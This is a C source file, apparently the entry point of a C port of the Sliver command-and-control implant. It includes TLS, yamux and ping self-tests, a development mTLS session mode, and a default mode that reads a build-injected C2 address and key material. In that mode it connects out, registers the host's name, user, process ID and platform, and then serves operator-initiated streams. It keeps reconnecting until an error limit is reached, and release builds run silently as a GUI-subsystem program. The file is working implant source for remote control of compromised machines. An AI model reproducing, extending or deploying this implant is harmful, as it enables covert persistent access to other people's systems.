/* src/entry/main.c - console entry point (M0 smoke build).
 *
 * M0 scope: prove the toolchain matrix, the configuration injection and the
 * platform abstraction work on Windows/Linux with MSVC/MinGW/Clang. The real
 * session/beacon loops land in M1.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if defined(_WIN32)
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#endif

#include "sliver/config.h"
#include "sliver/frame.h"
#include "sliver/log.h"
#include "sliver/platform.h"
#include "sliver/proto.h"
#include "sliver/session.h"
#include "sliver/transport.h"
#include "sliver/yamux.h"

#define SLIVER_SMOKE_ITERATIONS 20000

typedef struct {
  sliver_mutex_t *mutex;
  long counter;
} smoke_state_t;

static void smoke_worker(void *arg) {
  smoke_state_t *state = (smoke_state_t *)arg;
  for (int i = 0; i < SLIVER_SMOKE_ITERATIONS; ++i) {
    sliver_mutex_lock(state->mutex);
    state->counter += 1;
    sliver_mutex_unlock(state->mutex);
  }
}

static void print_banner(void) {
  (void)printf("sliver-cpp implant %s (build %s)\n", sliver_config_name(),
               sliver_config_build_id());
}

static void print_config(void) {
  (void)printf("  strategy         : %c\n", sliver_config_strategy());
  (void)printf("  c2 endpoints     : %u\n", (unsigned)sliver_config_c2_count());
  for (size_t i = 0; i < sliver_config_c2_count(); ++i) {
    (void)printf("    [%u] %s\n", (unsigned)i, sliver_config_c2_url(i));
  }
  (void)printf("  reconnect (ms)   : %lld\n",
               sliver_config_reconnect_interval_ns() / 1000000LL);
  (void)printf("  beacon interval  : %lld ms\n",
               sliver_config_beacon_interval_ns() / 1000000LL);
  (void)printf("  beacon jitter    : %lld ms\n",
               sliver_config_beacon_jitter_ns() / 1000000LL);
  (void)printf("  max conn errors  : %d\n", sliver_config_max_connection_errors());
  (void)printf("  transports       : mtls=%d http=%d dns=%d wg=%d pivot=%d\n",
               sliver_config_feature_mtls(), sliver_config_feature_http(),
               sliver_config_feature_dns(), sliver_config_feature_wg(),
               sliver_config_feature_pivot());
}

static int run_smoke(void) {
  smoke_state_t state = {0};
  sliver_thread_t *threads[4] = {0};
  int rc = 0;

  state.mutex = sliver_mutex_create();
  state.counter = 0;
  if (state.mutex == NULL) {
    (void)fprintf(stderr, "mutex_create failed\n");
    return 1;
  }
  for (size_t i = 0; i < sizeof(threads) / sizeof(threads[0]); ++i) {
    threads[i] = sliver_thread_create(smoke_worker, &state);
    if (threads[i] == NULL) {
      (void)fprintf(stderr, "thread_create failed\n");
      rc = 1;
      threads[i] = NULL;
    }
  }
  for (size_t i = 0; i < sizeof(threads) / sizeof(threads[0]); ++i) {
    if (threads[i] != NULL && sliver_thread_join(threads[i]) != 0) {
      rc = 1;
    }
  }
  (void)printf("smoke: counter=%ld expected=%d\n", state.counter,
               SLIVER_SMOKE_ITERATIONS * 4);
  if (state.counter != (long)(SLIVER_SMOKE_ITERATIONS * 4)) {
    rc = 1;
  }
  sliver_mutex_destroy(state.mutex);
  return rc;
}

static char *read_file(const char *path) {
  FILE *f = fopen(path, "rb");
  long size;
  char *buf;
  if (f == NULL) {
    return NULL;
  }
  if (fseek(f, 0, SEEK_END) != 0) {
    (void)fclose(f);
    return NULL;
  }
  size = ftell(f);
  if (size < 0) {
    (void)fclose(f);
    return NULL;
  }
  rewind(f);
  buf = (char *)malloc((size_t)size + 1);
  if (buf == NULL) {
    (void)fclose(f);
    return NULL;
  }
  if (fread(buf, 1, (size_t)size, f) != (size_t)size) {
    free(buf);
    (void)fclose(f);
    return NULL;
  }
  buf[size] = '\0';
  (void)fclose(f);
  return buf;
}

/* --tls-selftest <host> <port> <ca.pem> <cert.pem> <key.pem>
 *
 * Performs a real TLS 1.3 mutual-auth handshake, writes the yamux preface and
 * echoes one line, then prints the negotiated parameters. This is the target to
 * single-step in VS2022 (breakpoints in src/transport/tls_client.c). */
static int run_tls_selftest(int argc, char **argv) {
  const char *host, *ca_path, *cert_path, *key_path;
  uint16_t port;
  char err[256];
  char *ca, *cert, *key;
  sliver_tls_t *conn = NULL;
  int rc = 1;

  if (argc < 7) {
    (void)fprintf(stderr,
                  "usage: %s --tls-selftest <host> <port> <ca.pem> <cert.pem> <key.pem>\n",
                  argv[0]);
    return 2;
  }
  host = argv[2];
  port = (uint16_t)strtoul(argv[3], NULL, 10);
  ca_path = argv[4];
  cert_path = argv[5];
  key_path = argv[6];

  ca = read_file(ca_path);
  cert = read_file(cert_path);
  key = read_file(key_path);
  if (ca == NULL || cert == NULL || key == NULL) {
    (void)fprintf(stderr, "cannot read one of: %s %s %s\n", ca_path, cert_path, key_path);
    free(ca);
    free(cert);
    free(key);
    return 2;
  }

  err[0] = '\0';
  if (sliver_tls_connect(&conn, host, port, ca, cert, key, err, sizeof(err)) != 0) {
    (void)fprintf(stderr, "handshake failed: %s\n", err);
    goto out;
  }
  (void)printf("handshake ok: %s / %s\n", sliver_tls_version(conn),
               sliver_tls_ciphersuite(conn));

  if (sliver_tls_write(conn, SLIVER_YAMUX_PREFACE, SLIVER_YAMUX_PREFACE_LEN) !=
      SLIVER_YAMUX_PREFACE_LEN) {
    (void)fprintf(stderr, "write of MUX/1 failed\n");
    goto out;
  }
  {
    char line[256];
    size_t used = 0;
    const char *hello = "sliver-cpp hello\n";
    if (sliver_tls_write(conn, hello, strlen(hello)) != (long)strlen(hello)) {
      (void)fprintf(stderr, "write of probe line failed\n");
      goto out;
    }
    while (used < sizeof(line) - 1) {
      long n = sliver_tls_read(conn, line + used, sizeof(line) - 1 - used);
      if (n <= 0) {
        break;
      }
      used += (size_t)n;
      line[used] = '\0';
      if (strstr(line, "hello") != NULL) {
        break;
      }
    }
    if (used == 0) {
      (void)fprintf(stderr, "read of echo failed\n");
      goto out;
    }
    line[used] = '\0';
    (void)printf("echo (%u bytes): %s", (unsigned)used, line);
  }
  rc = 0;

out:
  if (conn != NULL) {
    sliver_tls_close(conn);
  }
  free(ca);
  free(cert);
  free(key);
  return rc;
}

/* --yamux-selftest <host> <port> <age-priv> <server.pub>
 *
 * Plain-TCP yamux interop check: writes the MUX/1 preface, opens a stream,
 * sends a signed Envelope{Ping} and verifies the signed reply. This covers the
 * layers above TLS without needing a Sliver server. */
typedef struct {
  sliver_yamux_t *y;
  uint32_t stream_id;
  int failed;
} yamux_bridge_t;

static long sock_read_cb(void *ctx, void *buf, size_t len) {
  return sliver_socket_recv((sliver_socket_t *)ctx, buf, len);
}

static long sock_write_cb(void *ctx, const void *buf, size_t len) {
  return sliver_socket_send((sliver_socket_t *)ctx, buf, len);
}

static long yamux_bridge_read(void *ctx, void *buf, size_t len) {
  yamux_bridge_t *b = (yamux_bridge_t *)ctx;
  long n = sliver_yamux_read(b->y, b->stream_id, buf, len);
  if (n < 0) {
    b->failed = 1;
  }
  return n;
}

static long yamux_bridge_write(void *ctx, const void *buf, size_t len) {
  yamux_bridge_t *b = (yamux_bridge_t *)ctx;
  if (sliver_yamux_write(b->y, b->stream_id, buf, len) != 0) {
    b->failed = 1;
    return -1;
  }
  return (long)len;
}

static int run_yamux_selftest(int argc, char **argv) {
  const char *host, *age_priv, *pub_path;
  uint16_t port;
  sliver_socket_t *sock = NULL;
  sliver_yamux_t yamux;
  yamux_bridge_t bridge;
  sliver_frame_signer_t signer;
  sliver_buf_t ping, envelope, reply;
  sliver_envelope_t env;
  char *pub_text;
  int32_t nonce = 0;
  uint32_t sid = 0;
  int rc = 1;

  if (argc < 6) {
    (void)fprintf(stderr,
                  "usage: %s --yamux-selftest <host> <port> <age-priv> <server.pub>\n",
                  argv[0]);
    return 2;
  }
  host = argv[2];
  port = (uint16_t)strtoul(argv[3], NULL, 10);
  age_priv = argv[4];
  pub_path = argv[5];

  pub_text = read_file(pub_path);
  if (pub_text == NULL) {
    (void)fprintf(stderr, "cannot read %s\n", pub_path);
    return 2;
  }
  if (sliver_frame_signer_init(&signer, age_priv) != 0) {
    (void)fprintf(stderr, "signer init failed\n");
    free(pub_text);
    return 2;
  }

  sock = sliver_tcp_connect(host, port);
  if (sock == NULL) {
    (void)fprintf(stderr, "tcp connect failed\n");
    free(pub_text);
    return 1;
  }
  if (sliver_socket_send(sock, SLIVER_YAMUX_PREFACE, SLIVER_YAMUX_PREFACE_LEN) !=
      SLIVER_YAMUX_PREFACE_LEN) {
    (void)fprintf(stderr, "MUX/1 write failed\n");
    goto out_sock;
  }
  if (sliver_yamux_client(&yamux, sock_read_cb, sock_write_cb, sock) != 0) {
    goto out_sock;
  }
  if (sliver_yamux_open(&yamux, &sid) != 0) {
    (void)fprintf(stderr, "yamux open failed\n");
    goto out_yamux;
  }
  bridge.y = &yamux;
  bridge.stream_id = sid;
  bridge.failed = 0;

  sliver_buf_init(&ping);
  sliver_buf_init(&envelope);
  sliver_buf_init(&reply);
  if (sliver_ping_encode(&ping, 31337) != 0 ||
      sliver_envelope_encode(&envelope, 0, SLIVER_MSG_PING, ping.data, ping.len) != 0) {
    (void)fprintf(stderr, "envelope encode failed\n");
    goto out_bufs;
  }
  if (sliver_frame_write(&signer, yamux_bridge_write, &bridge, envelope.data, envelope.len) != 0) {
    (void)fprintf(stderr, "frame write failed\n");
    goto out_bufs;
  }
  (void)sliver_yamux_close_write(&yamux, sid);

  if (sliver_frame_read(pub_text, yamux_bridge_read, &bridge, &reply) != 0) {
    (void)fprintf(stderr, "reply frame read/verify failed (bridge_failed=%d, got=%u)\n",
                  bridge.failed, (unsigned)reply.len);
    goto out_bufs;
  }
  if (sliver_envelope_decode(reply.data, reply.len, &env) != 0) {
    (void)fprintf(stderr, "reply envelope decode failed\n");
    goto out_bufs;
  }
  (void)printf("yamux ok: stream=%u reply type=%u", sid, env.type);
  if (env.type == SLIVER_MSG_PING && sliver_ping_decode_nonce(env.data, env.data_len, &nonce) == 0) {
    (void)printf(" nonce=%d", nonce);
  }
  (void)printf("\n");
  rc = 0;

out_bufs:
  sliver_buf_free(&reply);
  sliver_buf_free(&envelope);
  sliver_buf_free(&ping);
out_yamux:
  sliver_yamux_free(&yamux);
out_sock:
  sliver_socket_close(sock);
  free(pub_text);
  return rc;
}

/* --mtls <host> <port> <ca.pem> <cert.pem> <key.pem> <age-priv> <server.pub> [name]
 *
 * Development entry point for the real session: TLS 1.3 -> MUX/1 -> yamux ->
 * signed Register, then serves server initiated streams until the connection
 * dies. In the shipped implant every parameter comes from config.json instead. */
static int run_mtls_session(int argc, char **argv) {
  sliver_session_config_t cfg;
  sliver_register_t reg;
  char hostname[128];
  char username[128];
  const char *name;

  if (argc < 9) {
    (void)fprintf(stderr,
                  "usage: %s --mtls <host> <port> <ca.pem> <cert.pem> <key.pem> "
                  "<age-priv> <server.pub> [name]\n",
                  argv[0]);
    return 2;
  }
  memset(&cfg, 0, sizeof(cfg));
  memset(&reg, 0, sizeof(reg));

  cfg.host = argv[2];
  cfg.port = (uint16_t)strtoul(argv[3], NULL, 10);
  cfg.ca_pem = read_file(argv[4]);
  cfg.cert_pem = read_file(argv[5]);
  cfg.key_pem = read_file(argv[6]);
  cfg.age_private_key = argv[7];
  cfg.server_minisign_pubkey = read_file(argv[8]);
  if (cfg.ca_pem == NULL || cfg.cert_pem == NULL || cfg.key_pem == NULL ||
      cfg.server_minisign_pubkey == NULL) {
    (void)fprintf(stderr, "cannot read one of the PEM/pubkey files\n");
    return 2;
  }

  name = argc > 9 ? argv[9] : sliver_config_name();
  (void)snprintf(reg.name, sizeof(reg.name), "%s", name);
  if (sliver_hostname(hostname, sizeof(hostname)) == 0) {
    (void)snprintf(reg.hostname, sizeof(reg.hostname), "%s", hostname);
  }
  if (sliver_username(username, sizeof(username)) == 0) {
    (void)snprintf(reg.username, sizeof(reg.username), "%s", username);
  }
  (void)snprintf(reg.uuid, sizeof(reg.uuid), "%s",
                 sliver_config_build_id()[0] != '\0' ? sliver_config_build_id()
                                                     : sliver_config_name());
  (void)snprintf(reg.os, sizeof(reg.os), "%s",
#if defined(_WIN32)
                 "windows"
#else
                 "linux"
#endif
  );
  (void)snprintf(reg.arch, sizeof(reg.arch), "%s", sizeof(void *) == 8 ? "amd64" : "386");
  reg.pid = (int32_t)sliver_current_pid();
  (void)snprintf(reg.filename, sizeof(reg.filename), "%s", argv[0]);
  (void)snprintf(reg.version, sizeof(reg.version), "%s", "1.7.8");
  reg.reconnect_interval = sliver_config_reconnect_interval_ns();
  (void)snprintf(reg.config_id, sizeof(reg.config_id), "%s",
                 sliver_config_build_id()[0] != '\0' ? sliver_config_build_id()
                                                     : sliver_config_name());
  (void)snprintf(reg.locale, sizeof(reg.locale), "%s", "en-US");
  cfg.reg = reg;

  LOG_INFO("connecting to %s:%u", cfg.host, (unsigned)cfg.port);
  return sliver_session_run(&cfg) == 0 ? 0 : 1;
}

/* Default (no arguments) entry point: everything comes from the build-time
 * injected configuration (config.json -> implant_secrets.c), exactly like the
 * Go implant. This is what `generate-cpp` produces. */
static int run_from_build_config(const char *argv0) {
  sliver_session_config_t cfg;
  sliver_register_t reg;
  const char *c2 = sliver_config_c2_url(0);
  const char *host_part;
  const char *colon;
  char host[256];
  size_t host_len;
  char hostname[128];
  char username[128];

  if (c2 == NULL) {
    LOG_ERROR("config: no C2 endpoint injected");
    return -1;
  }
  if (strncmp(c2, "mtls://", 7) != 0) {
    LOG_ERROR("config: transport %s is not implemented yet (only mtls://)", c2);
    return -1;
  }
  host_part = c2 + 7;
  colon = strrchr(host_part, ':');
  if (colon == NULL) {
    LOG_ERROR("config: mtls endpoint has no port: %s", c2);
    return -1;
  }
  host_len = (size_t)(colon - host_part);
  if (host_len == 0 || host_len >= sizeof(host)) {
    LOG_ERROR("config: bad mtls host in %s", c2);
    return -1;
  }
  memcpy(host, host_part, host_len);
  host[host_len] = '\0';

  memset(&cfg, 0, sizeof(cfg));
  cfg.host = host;
  cfg.port = (uint16_t)strtoul(colon + 1, NULL, 10);
  cfg.ca_pem = sliver_config_secret(SLIVER_SECRET_MTLS_CA_CERT);
  cfg.cert_pem = sliver_config_secret(SLIVER_SECRET_MTLS_CERT);
  cfg.key_pem = sliver_config_secret(SLIVER_SECRET_MTLS_KEY);
  cfg.age_private_key = sliver_config_secret(SLIVER_SECRET_PEER_PRIVATE_KEY);
  cfg.server_minisign_pubkey = sliver_config_secret(SLIVER_SECRET_MINISIGN_SERVER_PUBLIC_KEY);
  if (cfg.ca_pem == NULL || cfg.cert_pem == NULL || cfg.key_pem == NULL ||
      cfg.age_private_key == NULL || cfg.server_minisign_pubkey == NULL) {
    LOG_ERROR("config: mTLS material is missing from the injected secrets");
    return -1;
  }

  memset(&reg, 0, sizeof(reg));
  (void)snprintf(reg.name, sizeof(reg.name), "%s", sliver_config_name());
  if (sliver_hostname(hostname, sizeof(hostname)) == 0) {
    (void)snprintf(reg.hostname, sizeof(reg.hostname), "%s", hostname);
  }
  if (sliver_username(username, sizeof(username)) == 0) {
    (void)snprintf(reg.username, sizeof(reg.username), "%s", username);
  }
  (void)snprintf(reg.uuid, sizeof(reg.uuid), "%s",
                 sliver_config_build_id()[0] != '\0' ? sliver_config_build_id()
                                                     : sliver_config_name());
  (void)snprintf(reg.os, sizeof(reg.os), "%s",
#if defined(_WIN32)
                 "windows"
#else
                 "linux"
#endif
  );
  (void)snprintf(reg.arch, sizeof(reg.arch), "%s", sizeof(void *) == 8 ? "amd64" : "386");
  reg.pid = (int32_t)sliver_current_pid();
  (void)snprintf(reg.filename, sizeof(reg.filename), "%s", argv0 != NULL ? argv0 : "");
  (void)snprintf(reg.version, sizeof(reg.version), "%s", "1.7.8");
  reg.reconnect_interval = sliver_config_reconnect_interval_ns();
  (void)snprintf(reg.config_id, sizeof(reg.config_id), "%s",
                 sliver_config_build_id()[0] != '\0' ? sliver_config_build_id()
                                                     : sliver_config_name());
  (void)snprintf(reg.locale, sizeof(reg.locale), "%s", "en-US");
  cfg.reg = reg;

  LOG_INFO("starting from injected config: %s:%u (%s)", host, (unsigned)cfg.port, c2);

  /* Sliver implants do not give up after one failed connection: retry every
   * ReconnectInterval until MaxConnectionErrors is exceeded. */
  {
    int attempts = 0;
    int max_errors = sliver_config_max_connection_errors();
    long long reconnect_ms = sliver_config_reconnect_interval_ns() / 1000000LL;
    if (reconnect_ms <= 0) {
      reconnect_ms = 60000;
    }
    for (;;) {
      if (sliver_session_run(&cfg) == 0) {
        return 0; /* peer closed the session cleanly */
      }
      attempts++;
      if (max_errors > 0 && attempts > max_errors) {
        LOG_ERROR("giving up after %d connection attempts", attempts);
        return 1;
      }
      LOG_INFO("reconnect in %lld ms (attempt %d/%d)", reconnect_ms, attempts, max_errors);
      sliver_sleep_ms((uint32_t)reconnect_ms);
    }
  }
}

static void print_diagnostics(void) {
  (void)printf("implant   : %s (build %s)\n", sliver_config_name(),
               sliver_config_build_id());
  (void)printf("transport : %s\n", sliver_config_c2_count() > 0 ? sliver_config_c2_url(0)
                                                               : "(none)");
#if defined(IMPLANT_CRYPTO_ENABLED)
  (void)printf("crypto    : mbedtls 3.6 + ed25519 + blake2b\n");
#else
  (void)printf("crypto    : NOT LINKED (IMPLANT_CRYPTO=OFF)\n");
#endif
#if defined(SLIVER_DEBUG_LOG) && SLIVER_DEBUG_LOG
  (void)printf("build     : debug (console logging enabled)\n");
#else
  (void)printf("build     : release (silent)\n");
#endif
}

int sliver_cli_main(int argc, char **argv) {
  char err[128];

  if (sliver_plat_init() != 0) {
    (void)fprintf(stderr, "platform init failed\n");
    return 1;
  }

#if defined(SLIVER_DEBUG_LOG) && SLIVER_DEBUG_LOG && defined(_WIN32)
  /* Debug builds always leave a log file, even when started from Explorer. */
  {
    char temp[MAX_PATH];
    char log_path[MAX_PATH];
    DWORD n = GetTempPathA(MAX_PATH, temp);
    if (n > 0 && n < MAX_PATH) {
      (void)snprintf(log_path, sizeof(log_path), "%ssliver-implant.log", temp);
      (void)sliver_log_set_file(log_path);
    }
  }
#endif

  /* Diagnostics run before the configuration check so a broken build can be
   * inspected (`implant.exe --version`). */
  if (argc > 1 && (strcmp(argv[1], "--version") == 0 || strcmp(argv[1], "-V") == 0)) {
    print_banner();
    print_diagnostics();
    sliver_plat_cleanup();
    return 0;
  }

  if (sliver_config_self_check(err, sizeof(err)) != 0) {
    LOG_ERROR("invalid configuration: %s", err);
    (void)fprintf(stderr, "invalid configuration: %s\n", err);
    sliver_plat_cleanup();
    return 2;
  }

  if (argc > 1 && strcmp(argv[1], "--self-test") == 0) {
    int rc = run_smoke();
    sliver_plat_cleanup();
    return rc;
  }
  if (argc > 1 && strcmp(argv[1], "--tls-selftest") == 0) {
    int rc = run_tls_selftest(argc, argv);
    sliver_plat_cleanup();
    return rc;
  }
  if (argc > 1 && strcmp(argv[1], "--yamux-selftest") == 0) {
    int rc = run_yamux_selftest(argc, argv);
    sliver_plat_cleanup();
    return rc;
  }
  if (argc > 1 && strcmp(argv[1], "--mtls") == 0) {
    int rc = run_mtls_session(argc, argv);
    sliver_plat_cleanup();
    return rc;
  }
  if (argc <= 1 || (argc > 1 && argv[1][0] != '-')) {
    /* Self-contained implant: no arguments, everything from the injected
     * config (this is what generate-cpp produces). */
    int rc = run_from_build_config(argc > 0 ? argv[0] : NULL);
    if (rc >= 0) {
      sliver_plat_cleanup();
      return rc;
    }
  }

  print_banner();
  print_config();
  LOG_INFO("layout ok; session/beacon loops arrive in M1");
  sliver_plat_cleanup();
  return 0;
}

int main(int argc, char **argv) { return sliver_cli_main(argc, argv); }

#if defined(_WIN32) && defined(IMPLANT_GUI_BUILD)
/* GUI subsystem has no CRT console entry point: provide WinMain and forward.
 * The implant does not need argv, so argc/argv are zeroed. */
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
  (void)hInstance;
  (void)hPrevInstance;
  (void)lpCmdLine;
  (void)nCmdShow;
  {
    /* GUI subsystem has no console: keep a log file so failures are visible,
     * and hand a real argv[0] to the CLI entry point (argc must not be 0). */
    char temp[MAX_PATH];
    char log_path[MAX_PATH];
    char *argv0 = "implant";
    char *argv[1];
    DWORD n = GetTempPathA(MAX_PATH, temp);
    (void)AttachConsole(ATTACH_PARENT_PROCESS); /* dev: output appears when run from a shell */
#if defined(SLIVER_DEBUG_LOG) && SLIVER_DEBUG_LOG
    /* Only debug builds keep a log file; release builds stay silent. */
    if (n > 0 && n < MAX_PATH) {
      (void)snprintf(log_path, sizeof(log_path), "%ssliver-implant.log", temp);
      (void)sliver_log_set_file(log_path);
    }
#else
    (void)log_path;
    (void)temp;
#endif
    LOG_INFO("implant starting (gui subsystem, pid %u)", (unsigned)GetCurrentProcessId());
    argv[0] = argv0;
    return sliver_cli_main(1, argv);
  }
}
#endif

